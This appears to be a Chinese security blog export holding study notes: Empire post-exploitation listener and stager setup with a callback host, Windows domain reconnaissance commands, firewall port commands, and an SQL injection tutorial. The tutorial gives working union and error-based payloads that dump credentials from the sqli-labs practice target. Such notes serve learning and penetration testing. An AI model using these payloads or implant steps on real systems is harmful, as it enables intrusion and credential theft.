<h5 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Empire)&gt; listeners #监听</span><br><span class="line"></span><br><span class="line">(Empire:listeners) &gt; uselistener http #选择监听方式</span><br><span class="line"></span><br><span class="line">(Empire:listeners&#x2F;http) &gt; info #查看需要配置的选项</span><br><span class="line"></span><br><span class="line">(Empire:listeners&#x2F;http) &gt; set Name backdoor #设置监听名字</span><br><span class="line"></span><br><span class="line">(Empire:listeners&#x2F;http) &gt; set Host http:&#x2F;&#x2F;ip #设置木马反弹回连地址</span><br><span class="line"></span><br><span class="line">(Empire:listeners&#x2F;http) &gt; set Port 4447 #设置本地监听端口</span><br><span class="line"></span><br><span class="line">(Empire:listeners&#x2F;http) &gt; execute #执行监听</span><br><span class="line"></span><br><span class="line">(Empire:listeners&#x2F;http) &gt; back #返回上层模块</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/07/11/13IfNbdg2JZHT9a.png" alt="image-20210711204158131"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Empire: listeners) &gt; usestager windows&#x2F;launcher_bat backdoo # 选择木马种类</span><br><span class="line"></span><br><span class="line">这里选择的是bat类型</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用empire使得主机上线后，收集主机信息主要用到了<code>powershell/situational_awareness/host/winenum</code>模块</p>
<p><code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>常用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami #查看当前权限</span><br><span class="line">ipconfig #查看网络配置</span><br><span class="line">systeminfo #操作系统信息</span><br><span class="line">tasklist &#x2F;v #查看进程</span><br><span class="line">net user #查询用户列表</span><br><span class="line">netstat -ano #端口</span><br><span class="line">netsh firewall show config #防火墙配置</span><br><span class="line">&#x2F;&#x2F;工具使用</span><br><span class="line">wmic</span><br><span class="line">empire</span><br></pre></td></tr></table></figure>


<h2 id="四、域内信息收集"><a href="#四、域内信息收集" class="headerlink" title="四、域内信息收集"></a>四、域内信息收集</h2><h3 id="1-判断是否存在域"><a href="#1-判断是否存在域" class="headerlink" title="1.判断是否存在域"></a>1.判断是否存在域</h3><p><code>ipconfig /all</code></p>
<p>查看网关 IP 地址、DNS 的 IP 地址、域名、<strong>本机是否和 DNS 服务器处于同一网段</strong></p>
<p>nslookup 解析域名的 IP 地址，<strong>查看是否与 DNS 服务器为同一 IP</strong></p>
<p><code>nslookup 域名</code></p>
<h4 id="系统详细信息"><a href="#系统详细信息" class="headerlink" title="系统详细信息"></a>系统详细信息</h4><p><code>systeminfo</code></p>
<p><code>systeminfo | findstr 域:</code>查看域</p>
<h4 id="当前登录域和域用户"><a href="#当前登录域和域用户" class="headerlink" title="当前登录域和域用户"></a>当前登录域和域用户</h4><p><code>net config workstation</code></p>
<h4 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h4><p><code>net time /domain</code></p>
<h3 id="2-收集域内基础信息"><a href="#2-收集域内基础信息" class="headerlink" title="2.收集域内基础信息"></a>2.收集域内基础信息</h3><h4 id="查看域"><a href="#查看域" class="headerlink" title="查看域"></a>查看域</h4><p><code>net view /domain</code></p>
<h4 id="查看域内计算机"><a href="#查看域内计算机" class="headerlink" title="查看域内计算机"></a>查看域内计算机</h4><p><code>net view /domain:domain_name</code></p>
<h4 id="查看域内用户列表"><a href="#查看域内用户列表" class="headerlink" title="查看域内用户列表"></a>查看域内用户列表</h4><p><code>net group /domain</code></p>
<h4 id="查看域用户组信息"><a href="#查看域用户组信息" class="headerlink" title="查看域用户组信息"></a>查看域用户组信息</h4><p><code>net group &quot;Enterprise Admins&quot; /domain</code></p>
<h4 id="查看域密码策略信息"><a href="#查看域密码策略信息" class="headerlink" title="查看域密码策略信息"></a>查看域密码策略信息</h4><p><code>net accounts /domain</code></p>
<h4 id="查看域信任信息"><a href="#查看域信任信息" class="headerlink" title="查看域信任信息"></a>查看域信任信息</h4><p><code>nltest /domain_trusts</code></p>
<h3 id="3-收集域用户和管理员信息"><a href="#3-收集域用户和管理员信息" class="headerlink" title="3.收集域用户和管理员信息"></a>3.收集域用户和管理员信息</h3><h4 id="查询域用户详细信息"><a href="#查询域用户详细信息" class="headerlink" title="查询域用户详细信息"></a>查询域用户详细信息</h4><p><code>wmic useraccount get /all</code></p>
<h4 id="查询存在的用户"><a href="#查询存在的用户" class="headerlink" title="查询存在的用户"></a>查询存在的用户</h4><p><code>dsquery user</code></p>
<p>常用的dsquery命令</p>
<blockquote>
<p> dsquery computer - 查找目录中的计算机</p>
<p>dsquery contact - 查找目录中的联系人</p>
<p>dsquery subnet - 查找目录中的子网</p>
<p>dsquery group - 查找目录中的组</p>
<p>dsquery ou - 查找目录中的组织单位</p>
<p>dsquery site - 查找目录中的站点</p>
<p>dsquery server - 查找目录中的域控制器</p>
<p>dsquery user - 查找目录中的用户</p>
<p>dsquery quota - 查找目录中的配额</p>
<p>dsquery partition - 查找目录中的分区</p>
<p>dsquery * - 用通用的 LDAP 查询查找目录中的任何对象</p>
</blockquote>
<h3 id="4-查找域控"><a href="#4-查找域控" class="headerlink" title="4.查找域控"></a>4.查找域控</h3><h4 id="查看域控机器名"><a href="#查看域控机器名" class="headerlink" title="查看域控机器名"></a>查看域控机器名</h4><p><code>nltest /dclist:域名</code></p>
<h4 id="查看域控主机名"><a href="#查看域控主机名" class="headerlink" title="查看域控主机名"></a>查看域控主机名</h4><p><code>nslookup -type=SRV _ldap._tcp</code></p>
<p><code>netdom query pdc</code></p>
<h4 id="查看域控组"><a href="#查看域控组" class="headerlink" title="查看域控组"></a>查看域控组</h4><p><code>net group &quot;domain controllers&quot; /domain</code></p>
<h3 id="5-定位域管理员"><a href="#5-定位域管理员" class="headerlink" title="5.定位域管理员"></a>5.定位域管理员</h3><h4 id="psloggedon"><a href="#psloggedon" class="headerlink" title="psloggedon"></a>psloggedon</h4><p><code>net session</code> 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机</p>
<p>使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/2JdMRgA9TlCV5hwO6ihVWQ">内网学习笔记 | 1、内网中常见名词解释</a></p>
<p>内网安全攻防渗透测试实战指南</p>
<p><a href="http://www.52bug.cn/hkjs/5194.html">内网工具学习之Empire后渗透</a></p>
<p><a href="http://www.360doc.com/content/18/0228/22/11935121_733281640.shtml">Empire一款强大的后渗透测试神器</a></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>端口那些事</title>
    <url>/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<p>想要开放端口，要先去了解防火墙状态和网络命令</p>
<h2 id="centos下"><a href="#centos下" class="headerlink" title="centos下"></a>centos下</h2><h3 id="查看已经开放的所有端口"><a href="#查看已经开放的所有端口" class="headerlink" title="查看已经开放的所有端口"></a>查看已经开放的所有端口</h3><p> <code>netstat -anp</code></p>
<h3 id="查看端口被哪个服务占用"><a href="#查看端口被哪个服务占用" class="headerlink" title="查看端口被哪个服务占用"></a>查看端口被哪个服务占用</h3><p><code>netstat -anp | grep 端口号</code></p>
<h3 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h3><p><code>systemctl status firewalld</code></p>
<p><img src="https://i.loli.net/2021/07/05/qgC2dVhBQRUEc84.png" alt="image-20210705163816093"></p>
<p><img src="https://i.loli.net/2021/07/05/d5mTi73gSVhyGMP.png" alt="image-20210705095620194"></p>
<h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><p> <code>ps PID</code></p>
<p><img src="https://i.loli.net/2021/07/05/GEUzN6YjfeWwgO7.png"></p>
<h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><p> <code>kill -9 PID</code></p>
<h3 id="开启-关闭防火墙："><a href="#开启-关闭防火墙：" class="headerlink" title="开启/关闭防火墙："></a>开启/关闭防火墙：</h3><p><code>systemctl start/stop firewalld</code></p>
<h3 id="查看防火墙所有开放的端口："><a href="#查看防火墙所有开放的端口：" class="headerlink" title="查看防火墙所有开放的端口："></a>查看防火墙所有开放的端口：</h3><p><code>firewall-cmd --zone=public --list-ports</code></p>
<p><img src="https://i.loli.net/2021/07/05/T7Vr2jNFoUflEWb.png" alt="image-20210705162443473"></p>
<h3 id="查看某一端口是否开放："><a href="#查看某一端口是否开放：" class="headerlink" title="查看某一端口是否开放："></a>查看某一端口是否开放：</h3><p><code>firewall-cmd --query-port=端口/tcp</code></p>
<p><img src="https://i.loli.net/2021/07/05/F7jXHMA5IsGNnwx.png" alt="image-20210705163024044"></p>
<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p><code>firewall-cmd --add-port=端口号/tcp --permanent</code></p>
<h3 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h3><p><code>firewall-cmd --permanent --remove-port=端口号/tcp</code></p>
<p><img src="https://i.loli.net/2021/08/19/87XlK9j1esyLfGR.png" alt="image-20210819175722813"></p>
<h2 id="ubuntu-下还略有不同"><a href="#ubuntu-下还略有不同" class="headerlink" title="ubuntu 下还略有不同"></a>ubuntu 下还略有不同</h2><h3 id="查看防火墙当前状态"><a href="#查看防火墙当前状态" class="headerlink" title="查看防火墙当前状态"></a>查看防火墙当前状态</h3><p><code>ufw status</code></p>
<p><img src="https://i.loli.net/2021/07/05/RMgqjh9wQPKvmS6.png" alt="image-20210705180504549"></p>
<h3 id="开启-关闭防火墙"><a href="#开启-关闭防火墙" class="headerlink" title="开启/关闭防火墙"></a>开启/关闭防火墙</h3><p><code>ufw enable/disable</code></p>
<h3 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h3><p><code>ufw version</code></p>
<h3 id="开放某一端口"><a href="#开放某一端口" class="headerlink" title="开放某一端口"></a>开放某一端口</h3><p><code>ufw allow 端口号</code></p>
<h3 id="禁止某一端口"><a href="#禁止某一端口" class="headerlink" title="禁止某一端口"></a>禁止某一端口</h3><p><code>ufw delete allow  端口号</code>或是<code>ufw deny 端口号</code></p>
<h3 id="允许-拒绝外部访问本机"><a href="#允许-拒绝外部访问本机" class="headerlink" title="允许/拒绝外部访问本机"></a>允许/拒绝外部访问本机</h3><p><code>ufw default allow/deny</code></p>
<h3 id="允许某一网段的ip进行访问"><a href="#允许某一网段的ip进行访问" class="headerlink" title="允许某一网段的ip进行访问"></a>允许某一网段的ip进行访问</h3><p><code>ufw allow from 10.0.0.0/8</code></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
<p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
]]></content>
  </entry>
  <entry>
    <title>常见web漏洞学习之sql注入学习</title>
    <url>/2021/05/06/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="常见web漏洞学习之sql注入学习"><a href="#常见web漏洞学习之sql注入学习" class="headerlink" title="常见web漏洞学习之sql注入学习"></a>常见web漏洞学习之sql注入学习</h1><h2 id="类型划分"><a href="#类型划分" class="headerlink" title="类型划分"></a>类型划分</h2><h3 id="以注入类型划分"><a href="#以注入类型划分" class="headerlink" title="以注入类型划分"></a>以注入类型划分</h3><p>数字型注入</p>
<p>字符型注入</p>
<p>搜索型注入</p>
<p>宽字节注入</p>
<p>Base64变形注入</p>
<h3 id="以提交方式分类"><a href="#以提交方式分类" class="headerlink" title="以提交方式分类"></a>以提交方式分类</h3><p>GET注入</p>
<p>POST注入</p>
<p>Cookie注入</p>
<p>HTTP头注入（XFF注入、UA注入、REFERER注入）</p>
<h3 id="以获取信息的方式分类"><a href="#以获取信息的方式分类" class="headerlink" title="以获取信息的方式分类"></a>以获取信息的方式分类</h3><p>联合注入</p>
<p>报错注入</p>
<p>布尔盲注</p>
<p>时间盲注</p>
<p>堆查询注入</p>
<h2 id="判断是否存在注入点及其类型"><a href="#判断是否存在注入点及其类型" class="headerlink" title="判断是否存在注入点及其类型"></a>判断是否存在注入点及其类型</h2><h4 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h4><p>可以使用单引号，双引号，单括号，双括号判断是否报错，报错的话可能存在sql注入</p>
<h4 id="判断是否为数字型"><a href="#判断是否为数字型" class="headerlink" title="判断是否为数字型"></a>判断是否为数字型</h4><p>若<code>and 1=1</code>页面正常<code>and 1=2</code>页面错误，则为数字型注入</p>
<blockquote>
<p>原理：<code>select * from 表 where id=x</code></p>
</blockquote>
<blockquote>
<p>因为如果是数字型注入的话<code>and 1=2</code>逻辑为假，会返回错误</p>
</blockquote>
<h4 id="判断是否为字符型"><a href="#判断是否为字符型" class="headerlink" title="判断是否为字符型"></a>判断是否为字符型</h4><p>若<code>&#39;and &#39;1&#39;=&#39;1 </code>页面正常，<code>&#39;and &#39;1&#39;=&#39;2</code>页面错误，则为字符型</p>
<blockquote>
<p>原理：<code>select * from 表 where id=&#39;参数&#39;</code></p>
</blockquote>
<blockquote>
<p>这里的sql语句相当于<code>select * from 表名 where id=&#39;参数&#39;and &#39;1&#39;=&#39;1&#39;</code>因为这里的参数是字符类型，而这样构造sql语句正好是字符类型</p>
</blockquote>
<p>  <strong>两者最大的区别就是字符型需要单引号来闭合，而数字型不需要</strong></p>
<h4 id="判断是否为搜索型"><a href="#判断是否为搜索型" class="headerlink" title="判断是否为搜索型"></a>判断是否为搜索型</h4><p>根据<code>%&#39; and 1=1 and &#39;%&#39;=&#39;</code>(相当于<code>and 1=1</code>)与<code>%&#39; and 1=2 and &#39;%&#39;=&#39;</code>的回显进行判断</p>
<blockquote>
<p>原理：<code>select * from 表 where username like &#39;%$name%&#39;</code></p>
</blockquote>
<blockquote>
<p>相当于<code>select * from 表 where username like &#39;%$name%&#39; and 1=1 and &#39;%&#39;=&#39;%&#39;</code></p>
</blockquote>
<blockquote>
<p>pikachu靶场较详细的实例<a href="https://www.cnblogs.com/Hunter-01001100/p/11628286.html">pikachu-搜索型注入 #手工注入</a></p>
</blockquote>
<p>**PS:**字符型和搜索型注入可能需要注释符对<code>&#39;</code>或<code>%&#39;</code>进行注释，如上面的判断字符型注入的语句可以修改为<code>&#39; and 1=1 # </code>和<code>&#39; and 1=2 #</code>来进行判断，而这里的<code>#</code>就是对sql语句后面的<code>&#39;</code>进行注释，同理搜索型也一样</p>
<h4 id="易出现SQL注入的功能点"><a href="#易出现SQL注入的功能点" class="headerlink" title="易出现SQL注入的功能点"></a><strong>易出现SQL注入的功能点</strong></h4><blockquote>
<p>凡是和数据库有交互的地方都容易出现SQL注入，SQL注入经常出现在登陆页面、涉及获取HTTP头（user-agent / client-ip等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在HTTP头中的      client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 i  p的，有可能会被存储进数据库中从而与数据库发生交互导致sql注入。</p>
</blockquote>
<h2 id="根据特殊表判断数据库类型"><a href="#根据特殊表判断数据库类型" class="headerlink" title="根据特殊表判断数据库类型"></a>根据特殊表判断数据库类型</h2><p>目前接触的大部分都是MySQL，绝大多数的数据库的SQL语句都类似，但是当遇到其他类型的数据库时还是要通过<strong>特殊表</strong>来分辨数据库类型</p>
<p><img src="https://i.loli.net/2021/06/23/STMinrwE5BLNzVY.png" alt="判断数据库"></p>
<h4 id="不同数据库的特殊表"><a href="#不同数据库的特殊表" class="headerlink" title="不同数据库的特殊表"></a>不同数据库的特殊表</h4><blockquote>
<p>MySQL数据库的特有的表是 <strong>information_schema.tables ,</strong> access数据库特有的表是 <strong>msysobjects</strong> 、SQLServer 数据库特有的表是 <strong>sysobjects</strong> ,oracle数据库特有的表是 <strong>dual</strong></p>
</blockquote>
<p>判断语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from information_schema.tables) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//判断是否是 access数据库</span></span><br><span class="line"><span class="string">http://xxx/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) #</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//判断是否是Oracle数据库</span></span><br><span class="line"><span class="string">http://xxx/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> dual)<span class="operator">&gt;</span><span class="number">0</span> #</span><br></pre></td></tr></table></figure>
<p>对于MySQL数据库，<strong>information_schema</strong>数据库中的表是一个视图，都是只读的，不能进行增删改的操作</p>
<blockquote>
<p>information_schema数据库是MySQL5.0以上才有</p>
</blockquote>
<h4 id="information-schema表中三个重要的表："><a href="#information-schema表中三个重要的表：" class="headerlink" title="information_schema表中三个重要的表："></a>information_schema表中三个重要的表：</h4><ul>
<li>information_schema.<strong>schemata</strong>该表存储了所有的库名</li>
<li>information_schema.<strong>tables</strong>该表存储了所有的表名</li>
<li>information_schema.<strong>columns</strong>该表存储了所有的列名</li>
</ul>
<h2 id="0x01-union联合注入"><a href="#0x01-union联合注入" class="headerlink" title="0x01 union联合注入"></a>0x01 union联合注入</h2><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>适用于页面<strong>有显示列</strong>的注入</p>
<p>首先进行的是判断是否存在注入和确定其注入类型，然后<strong>根据注入类型</strong>依次进行列数判断、可显列、查库，查表、查列、查数据</p>
<p>以下以字符型注入为例（sqli-labs靶场）：</p>
<h3 id="列数判断"><a href="#列数判断" class="headerlink" title="列数判断"></a>列数判断</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x #</span></span><br></pre></td></tr></table></figure>
<h4 id="可显列"><a href="#可显列" class="headerlink" title="可显列"></a>可显列</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3,...x #</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>对于没有可显列的问题，是因为页面只显示一行数据，可以使用形如<em><strong>id=-1</strong></em>来进行注释或是<code>and 1=2</code>对前面的条件进行否定</p>
</blockquote>
<h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><h4 id="先来了解一些常用函数"><a href="#先来了解一些常用函数" class="headerlink" title="先来了解一些常用函数"></a>先来了解一些常用函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">·  version() ：数据库的版本</span><br><span class="line"></span><br><span class="line">·  database() :当前所在的数据库</span><br><span class="line"></span><br><span class="line">·  @@basedir : 数据库的安装目录</span><br><span class="line"></span><br><span class="line">·  @@datadir ： 数据库文件的存放目录</span><br><span class="line"></span><br><span class="line">·  user() ： 数据库的用户</span><br><span class="line"></span><br><span class="line">·  current_user() : 当前用户名</span><br><span class="line"></span><br><span class="line">·  system_user() : 系统用户名</span><br><span class="line"></span><br><span class="line">·  session_user() :连接到数据库的用户名</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),system_user() --+</span></span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/agNb9HG7lTsqodV.png" alt="image-20210509112349669"></p>
<h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><p>已知数据库<code>security</code>查表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>group_concat(username) ：</strong>将username数据查询在一起，用逗号连接</p>
</blockquote>
<h4 id="information-schema-tables表中记录了所有的表名"><a href="#information-schema-tables表中记录了所有的表名" class="headerlink" title="information_schema.tables表中记录了所有的表名"></a><em>information_schema.tables</em>表中记录了所有的表名</h4><h4 id="table-schema列记录了所有数据库的库名"><a href="#table-schema列记录了所有数据库的库名" class="headerlink" title="table_schema列记录了所有数据库的库名"></a><em>table_schema</em>列记录了所有数据库的库名</h4><p><img src="https://i.loli.net/2021/06/23/Q7djqByu4wJFTZx.png" alt="image-20210509115335643"></p>
<p><img src="https://i.loli.net/2021/06/23/2H54FxOoripDhzE.png" alt="image-20210509115550488"></p>
<h3 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot; --+</span></span><br></pre></td></tr></table></figure>
<h4 id="information-schema-columns表中记录了所有的列名"><a href="#information-schema-columns表中记录了所有的列名" class="headerlink" title="information_schema.columns表中记录了所有的列名"></a><em>information_schema.columns</em>表中记录了所有的列名</h4><h4 id="table-name列中记录了所有的表名"><a href="#table-name列中记录了所有的表名" class="headerlink" title="table_name列中记录了所有的表名"></a><em>table_name</em>列中记录了所有的表名</h4><p><img src="https://i.loli.net/2021/06/23/e9jNZbUsJ38lOFa.png" alt="image-20210509122157896"></p>
<h3 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(id,&#x27;</span><span class="comment">---&#x27;,username,&#x27;---&#x27;,password),3 from users --+</span></span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/IvUtTJPiGM7bBrV.png" alt="image-20210509122715852"></p>
<h2 id="0x02-报错注入"><a href="#0x02-报错注入" class="headerlink" title="0x02 报错注入"></a>0x02 报错注入</h2><h3 id="利用场景-1"><a href="#利用场景-1" class="headerlink" title="利用场景"></a>利用场景</h3><p>数据库查询的返回结果并没有在页面中显示，但是会显示数据库的报错信息（也就是union注入没有显示列）</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>数据库查询的返回结果并没有在页面中显示，但是会显示数据库的报错信息。可以通过构造数据库报错语句，从报错信息中获取到想要的内容</p>
<h3 id="一、floor报错注入"><a href="#一、floor报错注入" class="headerlink" title="一、floor报错注入"></a>一、floor报错注入</h3><p>利用<strong>count()<strong>、</strong>rand()<strong>、</strong>floor()<strong>、</strong>group by</strong>函数结合在一起产生的注入，缺一不可</p>
<h4 id="关键函数学习"><a href="#关键函数学习" class="headerlink" title="关键函数学习"></a>关键函数学习</h4><h5 id="rand-是随机函数"><a href="#rand-是随机函数" class="headerlink" title="rand()是随机函数"></a>rand()是随机函数</h5><p>通过一个固定的随机数0之后，可以形成固定的伪随机序列（就是rand(0)产生的数据是可预知的）</p>
<h5 id="floor-是取整函数"><a href="#floor-是取整函数" class="headerlink" title="floor()是取整函数"></a>floor()是取整函数</h5><p>floor(rand(0)*2)就是对rand(0)产生的随机序列乘2之后取整，结果也是固定的</p>
<h5 id="group-by是分组函数，将相同的数据分为一组"><a href="#group-by是分组函数，将相同的数据分为一组" class="headerlink" title="group by是分组函数，将相同的数据分为一组"></a>group by是分组函数，将相同的数据分为一组</h5><h5 id="count-是统计结果的行数"><a href="#count-是统计结果的行数" class="headerlink" title="count(*)是统计结果的行数"></a>count(*)是统计结果的行数</h5><p><img src="https://i.loli.net/2021/06/23/IEqVxQuGlW5Omwr.png" alt="image-20210509183416177"></p>
<p>形如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//分解来看</span></span><br><span class="line"><span class="string">concat(user(),floor(rand(0)*2))x起了个别名，也就是相当于concat(user(),floor(rand(0)*2))=x</span></span><br><span class="line"><span class="string">ps:这里的user()是要查询的函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">同理(select count(*),x from information_schema.tables group by x)=a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">也就是select 1 from a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>




<p>详细原理分析：</p>
<p><a href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究</a></p>
<p>以sqli-labs中less6为例</p>
<p>union注入不会回显列信息，故使用报错注入</p>
<p><img src="https://i.loli.net/2021/06/23/3ljneN2vBXV6xJ8.png" alt="image-20210509204534799"></p>
<h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"></span><br><span class="line">database()的位置可以嵌套sql语句进行查询</span><br><span class="line"></span><br><span class="line">//也可以通过information_schema.schemata表中的schema_name列查库</span><br><span class="line">(select schema_name from information_schema.schemata limit 0,1)</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/DMh2Ap34ikYQCcl.png" alt="image-20210509205248015"></p>
<blockquote>
<p>security后面的1是floor(rand(0)*2)产生的数字1</p>
</blockquote>
<h4 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这样查询的结果是只会显示一个字段，不加`limit <span class="number">0</span>,<span class="number">1</span>`又会报错`Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span>`</span><br><span class="line"></span><br><span class="line">解决办法：使用group_concat()函数查出所有内容</span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot;)</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/sH4W7MENVe5iQ9g.png" alt="table_name"></p>
<p><img src="https://i.loli.net/2021/06/23/8DR16C9LGcbyKPm.png" alt="group_concat(table_name)"></p>
<h4 id="查列，查数据"><a href="#查列，查数据" class="headerlink" title="查列，查数据"></a>查列，查数据</h4><p><img src="https://i.loli.net/2021/06/23/BzeDgcubZr5yFRH.png" alt="image-20210510090611516"></p>
<p>但是在查数据时会遇见一个奇怪的问题，使用*group_concat()*也出不来数据</p>
<p><img src="https://i.loli.net/2021/06/23/6T1bXrfCYkqeEvQ.png" alt="group_concat(id,username,password)"></p>
<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80650540">floor()报错注入</a></p>
<h3 id="二、extractvalue报错注入"><a href="#二、extractvalue报错注入" class="headerlink" title="二、extractvalue报错注入"></a>二、extractvalue报错注入</h3><blockquote>
<p>MySQL 5.1.5版本后才包含ExtractValue()和UpdateXML()这2个函数</p>
</blockquote>
<h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>extractvalue(xml_document,xpath_string)</p>
<blockquote>
<p>XML_document 是 String 格式，为 XML 文档对象的名称</p>
<p>XPath_string (Xpath 格式的字符串)</p>
</blockquote>
<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>从目标XML中返回包含所查询值的字符串（返回结果限制在32位字符）</p>
